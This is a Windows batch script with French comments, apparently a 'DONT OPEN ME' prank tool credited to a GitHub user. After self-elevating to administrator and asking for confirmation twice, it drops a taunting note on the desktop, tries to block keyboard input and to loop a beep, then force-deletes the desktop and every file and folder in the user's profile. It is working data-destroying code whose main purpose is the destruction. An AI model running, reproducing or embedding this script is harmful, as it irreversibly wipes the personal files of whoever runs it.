@echo off
:: Vérification des droits d'administrateur
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Ce script nécessite les droits d'administrateur.
    echo Demande des droits d'administrateur...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Menu principal
:menu
cls
echo =======================================================
echo                     !!! DONT OPEN ME !!!
echo =======================================================
echo Ce programme est **extrêmement destructeur**.
echo En l'exécutant, vous allez :
echo - Désactiver temporairement le clavier.
echo - Supprimer tous les fichiers et dossiers de votre profil utilisateur.
echo - Rendre le système inutilisable.
echo =======================================================
echo Êtes-vous sûr de vouloir lancer ce programme destructeur ?
echo Tapez "O" pour continuer ou "N" pour annuler.
set /p choice=

if /i "%choice%"=="O" goto start
if /i "%choice%"=="N" (
    echo Vous avez choisi d'annuler. Fermeture du programme.
    timeout /t 3 >nul
    exit /b
)
echo Choix invalide. Veuillez répondre par "O" ou "N".
timeout /t 2 >nul
goto menu

:start
:: Avertissement final
echo !!! ATTENTION ULTIME !!!
echo Ce script va complètement détruire votre système Windows.
echo Si ce script n'est pas exécuté dans une VM, les conséquences seront irréversibles.
echo Voulez-vous continuer ? (O/N)
set /p confirm=
if /i NOT "%confirm%"=="O" (
    echo Action annulée.
    exit /b
)

:: Création du fichier texte avec le message
echo CE LOGICIEL A DESACTIVE TOUT CE QUE TON PC POUVAIT AVOIR > "%userprofile%\Desktop\Avertissement.txt"
echo NewLifeIsHereDF sur github >> "%userprofile%\Desktop\Avertissement.txt"
echo TU AS ÉTÉ PRÉVENU, SI CELA N'A PAS ÉTÉ LANCÉ SUR UNE VM, RESET TON PC ! >> "%userprofile%\Desktop\Avertissement.txt"

:: Ouvre le fichier dans le Bloc-notes
start notepad "%userprofile%\Desktop\Avertissement.txt"

:: Boucle pour jouer un son Windows
echo Émission d'un son Windows en boucle...
(for /l %%i in () do (echo ^G)) | cmd

:: Désactivation temporaire du clavier
echo Désactivation du clavier...
rundll32 user32.dll,BlockInput 1
timeout /t 10 >nul
rundll32 user32.dll,BlockInput 0
echo Clavier réactivé.

:: Suppression de tout sur le bureau
set desktop=%userprofile%\Desktop
echo Suppression de tout sur le bureau : %desktop%
del /f /q "%desktop%\*" >nul 2>&1
rmdir /s /q "%desktop%" >nul 2>&1
echo Bureau vidé.

:: Suppression de tous les fichiers et dossiers utilisateur
set userfolder=%userprofile%
echo Suppression de tous les fichiers dans : %userfolder%
for /d %%i in ("%userfolder%\*") do (
    rmdir /s /q "%%i" >nul 2>&1
)
for %%i in ("%userfolder%\*") do (
    del /f /q "%%i" >nul 2>&1
)
echo Tous les fichiers et dossiers utilisateur ont été supprimés.

:: Message final
echo Script terminé. Le système est probablement inutilisable.
pause
